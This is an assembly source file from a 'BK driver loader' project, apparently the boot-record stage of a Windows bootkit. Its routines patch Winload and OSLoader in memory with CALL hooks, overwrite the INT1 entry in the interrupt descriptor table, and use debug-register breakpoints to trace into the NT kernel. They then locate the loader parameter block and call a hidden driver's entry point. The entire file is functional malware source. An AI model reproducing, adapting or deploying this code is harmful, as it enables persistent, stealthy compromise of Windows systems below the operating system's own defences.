;//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
;// BK driver loader project. Version 2.
;//	
;// module: vbr32.asm
;// description: 
;//	 BK Volume Boot Record. 32-bit functions.

.686p
.model flat, stdcall


include <windows.inc>
include	<catchy32.inc>
include	<vbr.inc>
include	<variables.h>



extern	Core16_start:DWORD
extern	Core16_end:DWORD
extern	Entry16_start:DWORD
extern	Entry16_end:DWORD
extern	Main16_start:DWORD
extern	Main16_end:DWORD
extern	Ofs_start:DWORD
extern	Ofs_end:DWORD


extern	Unpack_start:DWORD
extern	Unpack_end:DWORD
extern	DoMatch_start:DWORD
extern	DoMatch_end:DWORD
extern	GetBit_start:DWORD
extern	GetBit_end:DWORD
extern	NormalCp_start:DWORD
extern	NormalCp_end:DWORD
extern  GetGamma_start:DWORD
extern	GetGamma_end:DWORD

extern	Handler13_start:DWORD
extern	Handler13_end:DWORD
extern	PmInit_start:DWORD
extern	PmInit_end:DWORD

extern	PatchLdr_start:DWORD
extern	PatchLdr_end:DWORD
extern	HookIdt_start:DWORD
extern	HookIdt_end:DWORD

extern	LoadData_start:DWORD
extern	LoadData_end:DWORD


.data 

g_VBR_blocks	dd	HookIdt_start,		HookIdt_end,			B_CODE16
				dd	Unpack_start,		Unpack_end + 1,			0
				dd	DoMatch_start,		DoMatch_end + 1,		0
				dd	GetBit_start,		GetBit_end + 1,			0
				dd	GetGamma_start,		GetGamma_end + 1,		0
				dd	NormalCp_start,		NormalCp_end + 1,		0
				dd	ApplyRelocs,		ApplyRelocs_end+1,		0
				dd	Handler13_start,	Handler13_end,			B_CODE16
				dd	Ofs_start,			Ofs_end,				B_CODE16
				dd	PmInit_start,		PmInit_end,				B_CODE16
				dd	Main16_start,		Main16_end,				B_CODE16
				dd	Int1Handler,		Int1Handler_end,		0
				dd	PatchLdr_start,		PatchLdr_end,			B_CODE16
				dd	Winload,			Winload_end+1,			0
				dd	InitNt,				InitNt_end,				0
				dd	WlHook,				WlHook_end,				0
				dd	GetLoaderBlock,		GetLoaderBlock_end+1,	0
				dd	PatchCall,			PatchCall_end+1,		0
				dd	LoadData_start,		LoadData_end,			B_CODE16
				dd	BuildImage,			BuildImage_end+1,		0		
				dd	RestoreCall,		RestoreCall_end+1,		0
				dd	FileName,			FileName_end,			B_DATA
				dd	GetParamPtr,		GetParamPtr_end+1,		0
				dd	HookLoad5,			HookLoad5_end,			0
				dd	LoadFile5,			LoadFile5_end+1,		0
				dd	RegisterDriver,		RegisterDriver_end+1,	0
				
				
				
			
;//	---- Special blocks without indexes ----
				dd	Entry16_start,		Entry16_end,			B_ENTRY + B_CODE16
				dd	Core16_start,		Core16_end,				B_CORE + B_CODE16
				dd	0 


.code

PUBLIC	g_VBR_blocks



;// Scans Winload.exe or OSLoader.exe for the "0F00D8" (LTR EAX) signature.
;// This instruction executed just before transferring control to the NT kernel.
;// Patches found instruction with "CALL NEAR XXXX" to a hook fucntion.
Winload	proc
;// EDX - current instruction
;// ESI	- current code offset
;// EBP - core
	push edi

	push edx
	pop edi
	mov ecx, 70000h
	mov al, 0fh
@@:
	repnz scasb
	jecxz Winload_exit
	cmp word ptr [edi], 0d800h		;//  LTR EAX
	jnz @B

	REXW
	DECL_EDI

	MOV_CL_ID	F_WlHook
	call ebp
	db F_PatchCall

Winload_exit:
	pop edi
Winload_end::
	ret
Winload	endp



;// NT5 specific function.
;// Scans OSLoader.exe image for any BlLoadIMageEx() function call. 
;// Patches OSloader.exe at the "CALL" instruction.
HookLoad5	proc
;// EDX - any instruction within the OSloader.exe
;// 2 dwords of Pattern on stack
	pushad

	push edx
	pop edi

	mov ecx, 70000h
	mov al, 0e8h
@@:
	repnz scasb
	jecxz HookLoad5_exit

	cmp dword ptr [edi-5], 196a006ah
	jnz @B

	mov eax, [edi]
	lea edi, [edi+eax+4]

;// Patching found function entry instruction
	add esi, 8

	MOV_CL_ID	F_LoadFile5
	call ebp
	db F_PatchCall
HookLoad5_exit:
	popad
	ret 
HookLoad5_end::
HookLoad5	endp

;// NT5 hook function. 
;//	Replaces any BlLoadIMageEx() call, copies parameters and calls original function to load the driver module.
LoadFile5	proc
;// ---- dont't touch this coz it used to store our code base
;// ---- PUSHAD/MOV ESI,XXXX = CODE_BASE_OFFSET
	push esi
	mov esi, 12345678h
;//---------------------------------------------------------
	pushad

;// Loading CORE pointer
	mov ebp, var_offset_core
	add ebp, esi
	sub ebp, 8

;// Restoring patched bytes to original values
	mov cl, 9
	call ebp
	db F_RestoreCall

;// Obtaining function address
	mov edi, ecx


	GETPTR	F_FileName
	movzx edx, word ptr [eax]
	push eax
	pop esi
	shl edx, 4

	push edx
	add edx, (IMAGE_DOS_HEADER ptr [edx]).e_lfanew
	mov edx, (IMAGE_OPTIONAL_HEADER ptr [(IMAGE_NT_HEADERS ptr [edx]).OptionalHeader]).SizeOfImage

	add edx, 0fffh
	and edx, 0fffff000h
	push edx		;// image size bytes

;// Formating call stack, storing parameters
	push esi					;// pPageAddress
	push 1						;// Unknown1
	shr edx, 0ch
	push edx					;// NumberPages
	push 0						;// Unknown0
	push 9						;// AllocationProtect

;// Calling BlLoadIMageEx() function
	call edi

	mov edi, [esi]
	pop ecx			;// image size
	or edi, 0fff80000h
	shl edi, 0ch
	mov [esi], edi
	pop esi			;// old image base

	call ebp
	db F_BuildImage

	popad
	pop esi
LoadFile5_end::
	ret
LoadFile5	endp


BuildImage	proc
;//  RSI - old image base
;//  RDI - new image base
;//  ECX - image size (bytes)
	push ebx
	push edi
	rep movsb 
	pop ebx		;// image base

	mov esi, (IMAGE_DOS_HEADER ptr [ebx]).e_lfanew
	REXW
	add esi, ebx

	REXW
	mov edi, (IMAGE_OPTIONAL_HEADER ptr [(IMAGE_NT_HEADERS ptr [esi]).OptionalHeader]).BaseOfData	;// ImageBase for x64
	cmp (IMAGE_FILE_HEADER ptr [(IMAGE_NT_HEADERS ptr [esi]).FileHeader]).Machine, IMAGE_FILE_MACHINE_AMD64
	mov edx, [esi+0b0h]
	mov ecx, [esi+0b4h]
	jz @F
	mov edi, (IMAGE_OPTIONAL_HEADER ptr [(IMAGE_NT_HEADERS ptr [esi]).OptionalHeader]).ImageBase
	mov edx, [esi+0a0h]
	mov ecx, [esi+0a4h]
@@:
	test edx, edx
	jz @F

	REXW
	add edx, ebx

	call ebp
	db F_ApplyRelocs
@@:	
	pop ebx
BuildImage_end::
	ret
BuildImage	endp



 ApplyRelocs	proc
;// rbx = Image base
;// rdx = relocs table
;// ecx = size of relocs
	push ebp
	push edx
	pop ebp

_PROCESS_NEXT_RELOCATION_PAGE:
	jecxz _RELOCATIONS_NOT_FOUND
	mov esi, [ebp]							;// next page to apply
	REXW
	add esi, ebx
	
	mov edx, [ebp + 04h]					;// relocs size for current page
	sub ecx, edx
	cmp edx, 00000008h
	ja _CONTINUE
	REXW
	add ebp, edx
	sub ecx, edx
	jmp _PROCESS_NEXT_RELOCATION_PAGE
	
_CONTINUE:
	REXW
	add ebp, 08h
	sub edx, 08h
_CONTINUE1:
	push edx
	push ebx
	movzx edx, word ptr [ebp]
	REXW
	sub ebx, edi
	mov al, dh
	and edx, 0FFFh
	shr al, 4
	cmp al, IMAGE_REL_BASED_DIR64
	jz _DIR64
	cmp al, IMAGE_REL_BASED_HIGHLOW
	jnz _APPLY_NEXT_RELOC
_HIGHLOW:
	REXW
	add edx, esi
	add [edx], ebx
	jmp _APPLY_NEXT_RELOC
_DIR64:
	REXW
	add edx, esi
	REXW
	add ebx, [edx]
	xor eax,eax
	REXW
	mov [edx], ebx
	jz _APPLY_NEXT_RELOC
	add dword ptr [edx+4], 0fffff800h
	btr	dword ptr [edx], 31
_APPLY_NEXT_RELOC:	
	pop ebx
	pop edx
	REXW
	add ebp, 2
	sub edx, 2
	jnz _CONTINUE1
	jmp _PROCESS_NEXT_RELOCATION_PAGE
_RELOCATIONS_NOT_FOUND:	
	
	pop ebp
ApplyRelocs_end::
	ret
ApplyRelocs	endp


;// Restores patched CALL instruction and adjust the retpoint so it points to the restored instruction.
RestoreCall	proc
;// ESI - code base
;//	EDI - stack pointer
;// CL	- number of parameters pushed into the stack
;// returns:
;//	 ECX - original bytes offset
	
	INCL_ECX
	call ebp
	db F_GetParamPtr

	push esi
;// Restoring original code bytes
	sub dword ptr [edi], 5
	REXW
	mov edi, [edi]		
	mov ecx, var_code_size
	push edi
	REXW
	add esi, ecx
	movsb 
	movsd
	pop ecx
	pop esi
RestoreCall_end::
	ret
RestoreCall endp


;// Returns pointer to the parameter within the stack specified by it's index.
;// This is common function fo x86 and x64.
GetParamPtr	proc
;// CL - parameter index
;// returns:
;// EDI - pointer to a parameter 

	movzx ecx, cl
	xor eax, eax
	REXW
	INCL_EAX
	add eax, 2
	xchg eax, ecx
	INCL_EAX
	shl eax, cl
	xchg eax, ecx
	REXW 
	lea edi, [esp+ecx]
GetParamPtr_end::
	ret
GetParamPtr	endp


;// Patches specified offset with "CALL NEAR XXXX" instruction.
PatchCall	proc
;// EDI - offset to patch
;// CL	- hook function index

	push esi
	call ebp
	db F_Ofs

	push eax
	pop edx

	mov ecx, var_code_size
	mov [eax+CODE_BASE_OFFSET], esi
	
	REXW
	add esi, ecx
	REXW
	xchg esi, edi

	movsb
	movsd

	mov byte ptr [esi-5], 0e8h
	REXW
	sub edx, esi
	mov dword ptr [esi-4], edx
	pop esi
PatchCall_end::
	ret
PatchCall	endp

WlHook	proc
;// ---- dont't touch this coz it used to store our code base
;// ---- PUSHAD/MOV ESI,XXXX = CODE_BASE_OFFSET
	push esi 
	mov esi, 12345678h
;//---------------------------------------------------------

	push eax
	push ecx
	push edi

	mov ecx, 08f000008h
	mov edi, 08e000010h
	xor eax,eax
	REXW
	INCL_EAX
	cmovz edi, ecx
	INCL_EAX
	shl eax, 4
	xchg eax, ecx

	sub dword ptr [esp+ecx], 5
	REXW
	mov ecx, [esp+ecx]

	push ebp
	push edi	;// Descriptor part

	push ecx
	pop edi

	mov ebp, var_offset_core
	REXW
	add ebp, esi

	GETPTR	F_Int1Handler
	mov [eax+CODE_BASE_OFFSET], esi
	push eax
	
;// Restoring original code bytes
	mov ecx, var_code_size
	REXW
	add esi, ecx
	movsb 
	movsd

;// Resolving current IDT base
	push ecx
	sidt [esp-2]
	pop edi		;// IDT base

	pop eax		;// Int1Handler
	pop esi		;// Descriptor part
	movzx ecx, si
		
	mov word ptr [edi+ecx], ax
	shr eax, 16
	mov dword ptr [edi+ecx+2], esi
	mov word ptr [edi+ecx+6], ax

	mov dr0, edi
	mov eax, dr7
	or eax, 00030002h
	mov dr7, eax
	
	pop ebp
	pop edi
	pop ecx
	pop eax
	pop esi
	ret
WlHook_end::
WlHook	endp


;// Searches for NT kernel base and Loader parameter block. Initializes NT driver.
InitNt	proc
;// ECX - parent function base pointer (EBP) for x86.
;// EDX - any address within the NT image. 
	push edi
	push ebx

	push edx
	and word ptr [esp], 0f000h
	pop edx
	;// Searching for NT image base
@@:
	cmp word ptr [edx], 'ZM'
	jz @F
	REXW
	sub edx, 1000h
	jmp @B
@@:

;// ---------------------------------------------------------------------------------------------------------------------
;// Saving loaded module base within the NT kernel (for debugging only)
;	push ecx
;	GETPTR	F_FileName
;	push dword ptr [eax]
;	pop edi			;// Driver base
;	REXW
;	mov [edx+8], edi
;	pop ecx
;// ----------------------------------------------------------------------------------------------------------------------

	xor eax, eax
	;// Loading EBX to point to Loader parameter block pointer stored within the parent function stack.
	REXW
	lea ebx, [ecx+8]
	;// Checking architecture
	jnz @F

	;// Searching for 64-bit Loader parameter block
	call ebp
	db F_GetLoaderBlock
	jecxz InitNt_exit

@@:
	REXW
	mov ebx, [ebx]	;// KeLoaderBlock
	REXW
	mov ecx, [ebx]
	call ebp
	db F_RegisterDriver


InitNt_exit:
	pop ebx
	pop edi
	ret
InitNt_end::
InitNt	endp


;// Resolves pointer to x64 Loader parameter block.
;// Loader parameter block pointer is the first parameter of KiSystemStartup() function, 
;// which is the entry point of NT kernel image. The first parameter passed through RCX and is saved 
;// into nt!KeLoaderBlock variable. This function searches for the first "MOV [XXXX], RCX" instruction at
;// the beginning of KiSystemStartup() function. This will be KeLoaderBlock variable.
GetLoaderBlock	proc
;// RDX - NT kernel base
;// returns 
;//  RBX - KeLoaderBlock
 	
	mov ecx, (IMAGE_DOS_HEADER ptr [edx]).e_lfanew
	REXW
	lea edi, [edx+ecx]
	mov edi, (IMAGE_OPTIONAL_HEADER ptr [(IMAGE_NT_HEADERS ptr [edi]).OptionalHeader]).AddressOfEntryPoint
	REXW
	add edi, edx

	mov al, 48h					;// REXW
@@:
	repnz scasb
	jecxz GetLoaderBlock_end
	
	cmp word ptr [edi], 0d89h	;// MOV [XXXX], ECX
	jnz @B

	mov eax, [edi+2]
	REXW
	cwde
	push eax
	pop ecx

	REXW
	lea ebx, [ecx+edi+6]
 GetLoaderBlock_end::
	ret
 GetLoaderBlock	endp


;// Allocates and fills BK_LDR_CONTEXT structure and then calls DriverEntry.
RegisterDriver	proc
;// EBX - pointer to Loader parameter block.
;// EDX - NT kernel base.

	push edx
	push esi

	;// Saving x64 volatile registers so they could be used by the driver
	REXB			;//	push r8
	push eax		;//
	REXB			;//	push r9
	push ecx		;//
	REXB			;//	push r10
	push edx		;//
	REXB			;//	push r11
	push ebx		;//

	;// Preserving ESP, coz different architectures will use different number of parameters
	push esp
	pop esi

	;// Allocating and filling BK_LDR_CONTEXT structure on the stack
	push ebx		;// BK_LDR_CONTEXT.NtLoaderBlock
	push edx		;// BK_LDR_CONTEXT.NtImageBase

	;// There should be our driver base replacing it's name
	GETPTR	F_FileName
	push dword ptr [eax]
	pop edi			;// Driver base

	;//	Validating driver base pointer.
	;// It may happen that our driver was not loaded for any reason, 
	;//  in this case the pointer will not point to system addresses.
	REXW
	test edi, edi
	js @F

	;// NT5 x64 OSLoader loads 64-bit drivers in 32-bit mode.
	;// So our driver image base is 32-bit too. And here we have to convert it to the long-mode address.
	btr edi, 31
	jnc RegisterDriver_exit

	push edx
	mov [esp], edi
	pop edi

@@:
	;// Geting driver size and entry point from it's image
	mov ecx, (IMAGE_DOS_HEADER ptr [edi]).e_lfanew
	REXW
	lea edx, [edi+ecx]
	mov ecx, (IMAGE_OPTIONAL_HEADER ptr [(IMAGE_NT_HEADERS ptr [edx]).OptionalHeader]).SizeOfImage
	mov ebx, (IMAGE_OPTIONAL_HEADER ptr [(IMAGE_NT_HEADERS ptr [edx]).OptionalHeader]).AddressOfEntryPoint

	;// Setting IMAGE_FILE_RELOCS_STRIPPED flags to make sure our driver will not be relocated by MiReloadBootLoadedDrivers.
	;// The reason is that there are global linked structures like BOOT_DRIVER_LIST_ENTRY within our driver's data section.
	or	(IMAGE_FILE_HEADER ptr [(IMAGE_NT_HEADERS ptr [edx]).FileHeader]).Characteristics, IMAGE_FILE_RELOCS_STRIPPED

	REXW 
	add ebx, edi

	push ecx		;// BK_LDR_CONTEXT.DriverSize
	push ebx		;//	BK_LDR_CONTEXT.DriverEntry
	push edi		;//	BK_LDR_CONTEXT.DriverBase

	;//	Initializing parameters
	push esp
	pop edx
	
	;// Aligning stack 
	push edx
	and dword ptr [esp], 0fffffff0h
	pop esp
	
	xor ecx,ecx
	push ecx
	push ecx
	push edx
	push ecx
	;// Calling our driver entry
	call ebx	

RegisterDriver_exit:
	;// Restoring ESP
	push esi
	pop esp	

	;// Restoring x64 volatile registers
	REXB			;//	pop r11
	pop ebx			;//
	REXB			;//	pop r10
	pop edx			;//
	REXB			;//	pop r9
	pop ecx			;//
	REXB			;//	pop r8
	pop eax			;//

	pop esi
	pop edx
RegisterDriver_end::
	ret
RegisterDriver	endp


;// INT1 handler routine.
;// Used to process DR-breaking and tracing.
Int1Handler	proc
;// ---- dont't touch this coz it used to store our code base
;// ---- PUSH ESI/MOV ESI,XXXX = CODE_BASE_OFFSET
	push esi
	mov esi, 12345678h
;// ----------------------------------------------------------
;// Saving all registers used. Reinitializing DS and ES.
	push eax
	mov ax, ds
	push eax
	mov ax, es
	push eax
	mov ax, ss
	mov ds, ax
	mov es, ax

	push ecx
	push edx
	push ebp

;// Checking break condition
	mov ecx, dr6
	btr ecx, 2					;// DR2 break
	mov dr6, ecx
	setc cl

;// Clearing our breakpoints (if any)
	mov eax, dr7
	jc @F
	and eax, (not 0033000ah)	;// Disable	DR0 and DR1 breaks
@@:
	and eax, (not 00000020h)	;// Disable DR2 break
	mov dr7, eax

;// Initializing CORE pointer
	mov ebp, var_offset_core
	REXW
	add ebp, esi

;// Examining call stack, obtaining retpoint
	xor eax,eax
	REXW
	cmovz edx, [esp+38h]			;// retpoint for x64
	jz check_kernel

	mov edx, [esp+1ch]				;// retpoint for x86
	inc dword ptr [esp+14h]			;// to compensate REXW before IRETD

;// Checing retpoint if we were called from the NT kernel
check_kernel:
	REXW
	test edx, edx
	js code_kernel

;// 64-bit code ends here, leaving
	test eax,eax
	jz Int1_pop_and_leave

;// 32-bit only code here.
;// Any function called from here should preserve EBX and EDI
check_codes:
;// Checking if breaked on hooked function entry.
	test cl, cl	
	jz lmswitch

;// NT5 only. 
	push edx
	call ebp
	db F_Winload
	pop edx

;// Searchin for the new loader first
	call ebp
	db F_HookLoad5

;// Clearing EAX to reset trace
	xor eax,eax

lmswitch:
;// Setting or reseting TF, depending on EAX value.
;// Acctually TF is set until LmSwitch returns 0.
	and byte ptr [esp+24h+1], 0feh
	test eax,eax
	jz Int1_pop_and_leave
	or byte ptr [esp+24h+1], 1		;// set TF
Int1_pop_and_leave:
;// Restoring all registers used
	pop ebp
	pop edx
	pop ecx

	pop eax
	mov es, ax
	pop eax
	mov ds, ax
	pop eax
	pop esi
	REXW
	iretd

code_kernel:
	;// We need parent function EBP value on x86, 
	;//	 coz there is Loader parameter block pointer stored as the first function parameter.
	pop ecx		;//		Old EBP value
	push ecx

	call ebp
	db F_InitNt
	jmp Int1_pop_and_leave

Int1Handler_end::
Int1Handler	endp


;// Place to store the file name
FileName	proc
	db	sizeof(CHSS)	dup (33h)
FileName_end::
FileName	endp


 ;//--- API -----------------------------------------------------------------------------------------------------------------
 
 
GetInstructionLen proc buf:DWORD
	push esi
	mov esi, buf
	call c_Catchy
	pop esi
    ret
GetInstructionLen EndP


end